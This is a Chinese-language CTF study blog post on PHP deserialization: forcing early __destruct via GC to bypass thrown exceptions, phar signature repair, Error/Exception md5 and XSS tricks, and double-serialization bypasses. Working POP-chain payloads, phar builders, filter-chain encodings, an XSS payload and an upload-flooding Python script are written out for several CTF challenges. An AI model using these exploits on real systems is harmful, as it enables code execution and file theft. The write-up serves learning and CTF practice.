---
title: "php反序列化中的报错&GC与二次序列化问题"
slug: "php-unserialize-notes"
description: "水文"
date: 2022-04-24T21:42:33+08:00
categories: ["NOTES&SUMMARY"]
series: ["反序列化"]
tags: ["PHP", "unserialize"]
draft: false
toc: true
---

## 报错&GC相关问题

PHP是存在GC的语言，而反序列化对象时的`__destruct`就是对已new对象的回收，一个小栗子

```php
<?php
error_reporting(0);
class test{
    public $num;
    public function __construct($num){
        $this->num = $num;
        echo $this->num."__construct"."</br>";
    }
    public function __destruct(){
        echo $this->num."__destruct"."</br>";
    }
}

new test(1);
$a = new test(2);
$b = new test(3);
// 1__construct</br>1__destruct</br>2__construct</br>3__construct</br>3__destruct</br>2__destruct</br>
```

当下面的三行代码均和第一行一样，无引用和指向，那么都将会是依次的construct+destruct，但是在上述例子中，只有对象1没有引用和指向 所以只有它创建后立刻回收；再看下面这两种情况

```php
$c = array(new test(1), 0);
$c[0] = $c[1];
$a = new test(2);
$b = new test(3);
// 1__construct</br>1__destruct</br>2__construct</br>3__construct</br>3__destruct</br>2__destruct</br>
```

```php
$c = array(new test(1), 0);
// $c[0] = $c[1];
$a = new test(2);
$b = new test(3);
// 1__construct</br>2__construct</br>3__construct</br>3__destruct</br>2__destruct</br>1__destruct</br>
```

————很好理解：无变量指向的new的对象创建后即回收，有指向的按创建时间倒序回收（先创建的最后回收

问题的关键在于可能来搅局的`throw new Exception();`，比如

```php
unserialize($_GET['url']);
throw new Exception("xxx");
```

在这种情况下程序异常报错退出，我们pop链中重要的`__destruct`不会执行（它在对象正常销毁时被执行），比如一个很简单的pop链

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class errorr0{
    public $num;
    public function __destruct(){
        echo "hello __destruct";
        echo $this->num;
    }
}
class errorr1{
    public $err;
    public function __toString()
    {
        echo "hello __toString";
        $this->err->flag();
    }
}

class errorr2{
    public $err;
    public function flag()
    {
        echo "hello __flag()";
        eval($this->err);
    }
}

$e1 = new errorr0();
$e2 = new errorr1();
$e3 = new errorr2();

$e3->err = "phpinfo();";
$e2->err = $e3;
$e1->num = $e2;

$result = serialize($e1);
unserialize($result);
// O:7:"errorr0":1:{s:3:"num";O:7:"errorr1":1:{s:3:"err";O:7:"errorr2":1:{s:3:"err";s:10:"phpinfo();";}}}
```

如果我们向最后一行的unserialize之后再添加`throw new Exception`，我们会发现原来的phpinfo界面立刻就会消失，阻止`__destruct`的执行

针对这种情况，我们选择将对象插在有`NULL`元素的数组中

```php
$e1 = new errorr0();
$e2 = new errorr1();
$e3 = new errorr2();

$e3->err = "phpinfo();";
$e2->err = $e3;
$e1->num = $e2;

$c = array(0=>$e1, 1=>NULL);
// a:2:{i:0;O:7:"errorr0":1:{s:3:"num";O:7:"errorr1":1:{s:3:"err";O:7:"errorr2":1:{s:3:"err";s:10:"phpinfo();";}}}i:1;N;}
// a:2:{i:0;O:7:"errorr0":1:{s:3:"num";O:7:"errorr1":1:{s:3:"err";O:7:"errorr2":1:{s:3:"err";s:10:"phpinfo();";}}}i:0;N;}
```

而直接serialize($c)的结果也无法达到预期，数组中i=0是我们的对象，i=1是NULL，我们手动把i:1改为i:0，也就是改为NULL 让其失去引用，提前GC触发`__destruct`

### phar中的应用

而这种改动在phar中会造成签名错误（phpstorm会无法再识别），需要重新生成签名（不过依旧无法识别）

```python
from hashlib import sha1

file = open("arsenetang.phar","rb").read()
text = file[:-28]  # 读取开始到末尾除签名外内容
last = file[-8:]   # 读取最后8位的GBMB和签名flag
new_file = text+sha1(text).digest() + last  # 生成新的文件内容 此时sha1正确

open("change.phar","wb").write(new_file)
```

### [NSSCTF 2021]prize_p1

```php
<?php
highlight_file(__FILE__);
class getflag {
    function __destruct() {
        // echo getenv("FLAG");    // 目标
        echo "flag{111}";   // 本地测试
    }
}

class A {
    public $config;
    function __destruct() {
        if ($this->config == 'w') {
            $data = $_POST[0];  // 传入phar内容
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            file_put_contents("./tmp/a.txt", $data);    // 传入phar内容
        } else if ($this->config == 'r') {
            $data = $_POST[0];  // 文件路径
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            echo file_get_contents($data);  // phar触发反序列化
        }
    }
}
if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $_GET[0])) {
    die("我知道你想干吗，我的建议是不要那样做。");
}

unserialize($_GET[0]);  // 传入A的序列化
throw new Error("那么就从这里开始起航吧"); // 需绕 数组+i:0
```

对于A，写入

```php
<?php
class A {
    public $config='w';
}
$a = new A();
echo serialize($a);
// O:1:"A":{s:6:"config";s:1:"w";}
```

读

```php
<?php
class A {
    public $config='r';
}
$a = new A();
echo serialize($a);
// O:1:"A":1:{s:6:"config";s:1:"r";}
```

对于phar

```php
<?php
class getflag {
}
$a[] = new getflag();
$a[] = 1;

$phar = new Phar('phar.phar');
$phar -> startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');   // 设置stub，增加gif文件头
$phar -> addFromString('test.txt','test');  // 添加要压缩的文件
$phar -> setMetadata($a);  // 将自定义meta-data存入manifest
$phar -> stopBuffering();
```

将.metadata.bin中前面的一个i:1改为i:0后改签名

```python
from hashlib import sha1

file = open("phar.phar","rb").read()
text = file[:-28]  # 读取开始到末尾除签名外内容
last = file[-8:]   # 读取最后8位的GBMB和签名flag
new_file = text+sha1(text).digest() + last  # 生成新的文件内容 此时sha1正确

open("change.phar","wb").write(new_file)
```

python发包，避免特殊字符

```python
import requests
import gzip

url = 'http://localhost/temp/tttt.php'

file = open("./chang.phar", "rb") #打开文件
file_out = gzip.open("./ars2.zip", "wb+")#创建压缩文件对象
file_out.writelines(file)
file_out.close()
file.close()

requests.post(
    url,
    params={
        0: 'O:1:"A":{s:6:"config";s:1:"w";}'
    },
    data={
        0: open('./ars2.zip', 'rb').read()
    }
) # 写入

res = requests.post(
    url,
    params={
        0: 'O:1:"A":1:{s:6:"config";s:1:"r";}'
    },
    data={
        0: 'phar://tmp/a.txt'
    }
) # 触发

print(res.text)
```

![image-20220327000823801](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220327000823801.png)

得到flag

参考：[浅析GC回收机制与phar反序列化](http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

### [GFCTF 2021]文件查看器

User.class.php

```php
<?php
	error_reporting(0);
    class User{
        public $username;   // new Myerror();
        public $password;   // [new User(), "check"];

        public function login(){
            include("view/login.html");
            if(isset($_POST['username'])&&isset($_POST['password'])){
                $this->username=$_POST['username'];
                $this->password=$_POST['password'];
                if($this->check()){
                    header("location:./?c=Files&m=read");
                }
            }
        }

        public function check(){
            if($this->username==="admin" && $this->password==="admin"){
                return true;
            }else{
                echo "{$this->username}的密码不正确或不存在该用户"; // Myerror::__toString
                return false;
            }
        }

        public function __destruct(){
            (@$this->password)();   // pop入口 可以通过数组形式访问任意类的任意方法 User::check
        }

        public function __call($name,$arg){ // 不存在方法
            ($name)();
        }
    }
```

Files.class.php

```php
<?php
    class Files{
        public $filename;

        public function __construct(){
            $this->log();
        }

        public function read(){
            include("view/file.html");
            if(isset($_POST['file'])){  // 传入文件名
                $this->filename=$_POST['file'];
            }else{
                die("请输入文件名");
            }
            $contents=$this->getFile();
            echo '<br><textarea class="file_content" type="text" value='."<br>".$contents;
        }

        public function filter(){
            if(preg_match('/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i',$this->filename)){    // phar无疑 虽然被ban了 加filter绕过(utf-16提示
                throw new Error("这不合理");
            }
        }

        public function getFile(){
            $contents=file_get_contents($this->filename);
            $this->filter();    // 对filename过滤
            if(isset($_POST['write'])){
                file_put_contents($this->filename,$contents);   // 写入内容 phar
            }
            if(!empty($contents)){
                return $contents;   // 读phar 触发反序列化
            }else{
                die("该文件不存在或者内容为空");
            }
        }

         public function log(){
            $log=new Myerror();
        }

        public function __get($key){    // 读不存在属性
            ($key)($this->arg); // 目标 可rce
            // arg = 'cat /f*';
        }
    }
```

Myerror.class.php

```php
<?php
    class Myerror{
        public $message;    // new Files();

        public function __construct(){
            ini_set('error_log','/var/www/html/log/error.txt');
            ini_set('log_errors',1);
        }

        public function __tostring(){
            $test=$this->message->{$this->test};    // Files::__get
            return "test";
            // test = 'system'
        }
    }
```

构造pop链时，注意password

```php
$user = new User();
$files = new Files();
$myerror = new Myerror();

$files->arg = 'cat /f*';
$myerror->message = $files;
$myerror->test = 'system';
$user->username = $myerror;
// $user->password = [new User(), "check"]; 这样会使$user的两个字段都赋不上值
$user->password = [$user, "check"];

echo serialize($user);
// O:4:"User":2:{s:8:"username";O:7:"Myerror":2:{s:7:"message";O:5:"Files":2:{s:8:"filename";N;s:3:"arg";s:3:"dir";}s:4:"test";s:6:"system";}s:8:"password";a:2:{i:0;r:1;i:1;s:5:"check";}}
```

经测试可以触发，之后就是如何写phar的问题了

看代码可以知道没有直接的unserialize点，那大概率是phar，虽然没有上传处 但是Myerror类的构造方法中可以写日志

![image.png](https://i.loli.net/2021/11/28/a5WEKMOeYP8zcHg.png)

可以看到日志中有脏数据，我们需要借助过滤器的编码来删去；首先是清空文件内容，可以用`php://filter/read=consumed/resource=log/error.txt`

之后观察日志内容，脏数据+文件内容+脏数据，只用b64肯定不行，我们尝试把除文件之外的其他内容变为b64的非法字符，这样最后b64解码即可

我们可以先将数据转换为utf-16le的格式，由原先的utf-8转换为utf-16le时，每一位字符后面都会直接添加一个不可见字符`\0`，再转回utf-8时，之后后面带`\0`的才会被转换 其余的会被当成乱码；这符合我们的要求

![image.png](https://i.loli.net/2021/11/29/pAxRiFMUvS6lmLH.png)

题中utf-16le被ban了，我们用ucs-2来代替

最后要处理的时空字节，`file_get_contents`在加载有空字节的文件时会报warning，我们用quoted-printable这种编码，即`php://filter/convert.quoted-printable-decode`这种过滤器；它对于所有可打印字符的ascii码（除`=`以外）都不变，对于`=`和不可打印的ascii码以及非ascii码的数据编码时 会先将每个字节的二进制代码用两个16进制数表示 再在前面加一个等号，比如`=`->`=3D`

我们的编码顺序

```
base64-encode-> utf-8-> ucs-2-> convert.quoted-printable-decode
```

会被解码的顺序

```
convert.quoted-printable-decode-> ucs-2-> utf-8-> base64-decode
```

经过这三次编码后就会有纯净的phar文件内容

最最最后的考点，`throw new Error`的存在，我们还需要改`i:0`和签名

```php
<?php

class User{
    public $username;
    public $password;

    public function __construct()
    {
        $this->username = new Myerror();
    }
}

class Files{
    public $filename;
}

class Myerror{
    public $message;
}

$user = new User();
$files = new Files();
$myerror = new Myerror();

$files->arg = 'cat /f*';
$myerror->message = $files;
$myerror->test = 'system';
$user->username = $myerror;
$user->password = [$user, "check"];

$a = [$user, null];

$phar = new Phar('phar.phar');
$phar -> startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');   // 设置stub，增加gif文件头
$phar -> addFromString('test.txt','test');  // 添加要压缩的文件
$phar -> setMetadata($a);  // 将自定义meta-data存入manifest
$phar -> stopBuffering();
```

改签名和`i:0`（略

编码

```php
<?php
$b=file_get_contents('change.phar');
$payload=iconv('utf-8','UCS-2',base64_encode($b));
file_put_contents('payload.txt',quoted_printable_encode($payload));
$s = file_get_contents('payload.txt');
$s = preg_replace('/=\r\n/', '', $s);
echo $s;
```

开打：首先写payload，然后第一个过滤器

```
php://filter/write=convert.quoted-printable-decode/resource=log/error.txt
```

第二个

```
php://filter/write=convert.iconv.ucs-2.utf-8/resource=log/error.txt
```

第三个

```
php://filter/write=convert.base64-decode/resource=log/error.txt
```

这里出现一个问题，末尾等号少一个，我们需要在payload末尾再加一个`=00=3D`让等号正常露出

改好之后清空日志文件，直接三个过滤器一起用

```
php://filter/read=convert.quoted-printable-decode|convert.iconv.ucs-2.utf-8|convert.base64-decode/resource=log/error.txt
```

得到flag

参考：[wp](http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/)

## 原生报错/异常类

### Error/Exception - 绕md5

### [极客大挑战 2020]Greatphp

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```

平常都是用数组，但是这是在类里面，数组就不行了，得用原生类`Error`（php7）或`Exception`（php5 or 7），它有`__toString`方法，被触发后会以字符串形式输出当前保存情况，包括错误信息和当前报错的行号，而跟传入的参数没有关系；所以说可以构造两个类的实例，它们行号相同（被`__toString`调用后输出信息一样），但是本身不相同（传入参数不等）

```php
$payload = "?><?=include~".urldecode(urlencode(~'/flag'))."?>";
$a = new Error($payload,1); $b = new Error($payload,2);
$s = new SYCLOVER();
$s->syc = $a;
$s->lover = $b;
echo urlencode(serialize($s));
```

注意`$a`和`$b`写到一行

### Error/Exception - XSS

参考：[关于如何利用php的原生类进行XSS](https://www.cnblogs.com/NPFS/p/13385038.html)

```php
<?php
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);
echo unserialize($b);
```

## 二次序列化/fast destruct

https://zhuanlan.zhihu.com/p/405838002

```php
<?php
$raw = 'O:1:"A":1:{s:1:"a";s:1:"b";}';
echo serialize(unserialize($raw));
//O:1:"A":1:{s:1:"a";s:1:"b";}
```

上面是一个相当正常的二次序列化的栗子（将序列化结果反序列化后再序列化），值得注意的是这里并不是真的有一个类A，在操作时 php内部会把不存在的类转换成`__PHP_Incomplete_Class`这种特殊的类，同时将原始的类名`A`存放在`__PHP_Incomplete_Class_Name`这个属性中，其余属性存放方式不变；而我们在序列化这个对象的时候，serialize遇到`__PHP_Incomplete_Class`这个特殊类会倒推回来，序列化成`__PHP_Incomplete_Class_Name`值为类名的类，我们看到的序列化结果不是`O:22:"__PHP_Incomplete_Class_Name":2:{xxx}`而是`O:1:"A":1:{s:1:"a";s:1:"b";}`，所以如果我们构造

```php
<?php
$raw = 'a:2:{i:0;O:8:"stdClass":1:{s:3:"abc";N;}i:1;O:22:"__PHP_Incomplete_Class":1:{s:3:"abc";N;}}';
var_dump(unserialize($raw));
var_dump(unserialize(serialize(unserialize($raw))));
```

![image-20220421101436718](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220421101436718.png)

可以注意到在二次序列化后`__PHP_Incomplete_Class`为空，出现`serialize(unserialize($x))!=$x`的情况

### [强网杯 2021]WhereIsUWebShell

https://miaotony.xyz/2021/06/28/CTF_2021qiangwang/#toc-heading-5

```php
 <!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php-->
<?php
// index.php
ini_set('display_errors', 'on');
if(!isset($_COOKIE['ctfer'])){
    setcookie("ctfer",serialize("ctfer"),time()+3600);
}else{
    include "function.php";
    echo "I see your Cookie<br>";
    $res = unserialize($_COOKIE['ctfer']);
    if(preg_match('/myclass/i',serialize($res))){

        throw new Exception("Error: Class 'myclass' not found ");
    }
}
highlight_file(__FILE__);
echo "<br>";
highlight_file("myclass.php");
echo "<br>";
highlight_file("function.php");
<?php
// myclass.php
class Hello{
    public function __destruct()
    {   if($this->qwb) echo file_get_contents($this->qwb);
    }
}
?>
<?php
// function.php
function __autoload($classname){
    require_once "/var/www/html/$classname.php";
}
```

简化一下就是

```php
if (preg_match('/myClass/i', unserialize(serialize($_COOKIE['ctfer'])))){
    throw new Exception("Error: Class 'myclass' not found ");
}
```

很显然上下文中没有myClass这个类 二次序列化之后会直接报错，其中一种处理方式是去掉末尾的`}`

```
O:7:"myclass":1:{s:1:"h";O:5:"Hello":1:{s:3:"qwb";s:36:"e2a7106f1cc8bb1e1318df70aa0a3540.php";}
O%3A7%3A%22myclass%22%3A1%3A%7Bs%3A1%3A%22h%22%3BO%3A5%3A%22Hello%22%3A1%3A%7Bs%3A3%3A%22qwb%22%3Bs%3A36%3A%22e2a7106f1cc8bb1e1318df70aa0a3540%2Ephp%22%3B%7D
```

或者当属性为空时，属性值反序列化之后不会赋值到对象上，这样就能绕过myclass的限制（修改序列化数字元素个数）

```
O:8:"stdClass":4:{s:0:"";O:7:"myclass":0:{}s:1:"b";O:5:"Hello":1:{s:3:"qwb",s:36:"e2a7106f1cc8bb1e1318df70aa0a3540.php";}}
```

```php
// e2a7106f1cc8bb1e1318df70aa0a3540.php
<?php
include "bff139fa05ac583f685a523ab3d110a0.php";
include "45b963397aa40d4a0063e0d85e4fe7a1.php";

// bff139fa05ac583f685a523ab3d110a0.php
function PNG($file)	// 处理上传的PNG图片
{
    if(!is_file($file)){die("我从来没有见过侬");}
    $first = imagecreatefrompng($file);
    if(!$first){
        die("发现了奇怪的东西2333");
    }
    $size = min(imagesx($first), imagesy($first));	// 以最小宽度为限切割为正方形 我们直接生成的时候就搞个正方形
    unlink($file);
    $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
    if ($second !== FALSE) {
        imagepng($second, $file);
        imagedestroy($second);//销毁，清内存
    }
    imagedestroy($first);
}

// 45b963397aa40d4a0063e0d85e4fe7a1.php
function GenFiles(){
    $files = array();
    $str = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $len=strlen($str)-1;
    for($i=0;$i<10;$i++){
        $filename="php";
        for($j=0;$j<6;$j++){
            $filename  .= $str[rand(0,$len)];
        }
        // file_put_contents('/tmp/'.$filename,'flag{fake_flag}');
        $files[] = $filename;
    }
    return $files;
}

$file = isset($_GET['72aa377b-3fc0-4599-8194-3afe2fc9054b'])?$_GET['72aa377b-3fc0-4599-8194-3afe2fc9054b']:"404.html";
$flag = preg_match("/tmp/i",$file);
if($flag){
    PNG($file);
}
include($file);	// 包含那个PNG

$res = @scandir($_GET['dd9bd165-7cb2-446b-bece-4d54087185e1']);
if(isset($_GET['dd9bd165-7cb2-446b-bece-4d54087185e1'])&&$_GET['dd9bd165-7cb2-446b-bece-4d54087185e1']==='/tmp'){
    $somthing = GenFiles();
    $res = array_merge($res,$somthing);
}
// /e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=x&dd9bd165-7cb2-446b-bece-4d54087185e1=/tmp
shuffle($res);
@print_r($res);
?>
```

我们利用LFI via segmentfault那个技巧  |  [LFI via SegmentFault](https://www.jianshu.com/p/dfd049924258)

```
include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
```

`string.strip_tags`可以导致php在执行过程中Segment Fault

如果请求中同时存在一个上传文件的请求，这个文件会被保留，存储在/tmp/phpxxxxxxxxxxx（xxxxx是数字+字母的6位数），这个文件连续保存，不用竞争直接爆破（多线程上传文件，生成多个phpxxxxxxxxxxx）

```php
# -*- coding: utf-8 -*-

import requests
import string
import itertools

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

base_url = "http://eci-2ze9gh3z7jcw29alwhuz.cloudeci1.ichunqiu.com"


def upload_file_to_include(url, file_content):
    files = {'file': ('evil.jpg', file_content, 'image/jpeg')}
    try:
        response = requests.post(url, files=files)
        print(response)
    except Exception as e:
        print(e)


def generate_tmp_files():
    with open('miao.png', 'rb') as fin:
        file_content = fin.read()
    phpinfo_url = "%s/e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=php://filter/string.strip_tags/resource=passwd" % (
        base_url)
    length = 6
    times = int(len(charset) ** (length / 2))
    for i in range(times):
        print("[+] %d / %d" % (i, times))
        upload_file_to_include(phpinfo_url, file_content)


def main():
    generate_tmp_files()


if __name__ == "__main__":
    main()
```

反弹shell，suid提权后翻找flag